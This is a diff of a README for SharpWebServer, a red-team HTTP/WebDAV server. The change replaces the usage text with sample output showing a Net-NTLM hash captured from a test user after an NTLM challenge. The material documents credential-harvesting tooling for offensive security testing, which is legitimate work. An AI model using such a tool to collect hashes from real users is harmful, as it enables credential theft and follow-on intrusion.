@@ -44,22 +44,21 @@ C:\> SharpWebServer.exe port=8888 dir=C:\Windows\Temp verbose=true ntlm=true
     :: SharpWebServer ::
     a Red Team oriented C# Simple HTTP & WebDAV Server with Net-NTLM hashes capture functionality
 
-Authors:
-    - Dominic Chell (@domchell) from MDSec                - Net-NTLM hashes capture code borrowed from Farmer
-    - Mariusz B. / mgeeky, <mb [at] binary-offensive.com> - WebDAV implementation, NTLM Authentication keep-alive,
-                                                            all the rest.
+[.] Serving HTTP server on port  : 8888
+[.] Will run for this long       : 60 seconds
+[.] Verbose mode turned on.
+[.] NTLM mode turned on.
+[.] Serving files from directory : C:\Windows\Temp
 
-Usage:
-    SharpWebServer.exe <port=port> [dir=path] [verbose=true] [ntlm=true] [logfile=path]
+SharpWebServer [29.03.21, 17:55:14] NTLM: Sending 401 Unauthorized due to lack of Authorization header.
+SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 0 (401)
+SharpWebServer [29.03.21, 17:55:14] NTLM: Sending 401 Unauthorized with NTLM Challenge Response.
+SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 0 (401)
 
-Options:
-    port    - TCP Port number on which to listen (1-65535)
-    dir     - Directory with files to be hosted.
-    verbose - Turn verbose mode on.
-    seconds - Specifies how long should the server be running. Default: indefinitely
-    ntlm    - Require NTLM Authentication before serving files. Useful to collect NetNTLM hashes
-              (in MDSec's Farmer style)
-    logfile - Path to output logfile.
+[+] SharpWebServer: Net-NTLM hash captured:
+TestUser:::1122334455667788:66303EE2DF9417E2FE07E1B7FD663205:010100000000000092EC04E8B324D701C2B561D5FECBB325000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000010000000020000045E18A336DA58F5F0F826F846C699F77DCCF02BA5135525AC52EFBB0C0A1F1160A0010000000000000000000000000000000000009001C0048005400540050002F006C006F00630061006C0068006F00730074000000000000000000
+
+SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 11 (200)
 ```
 
 **Client**:
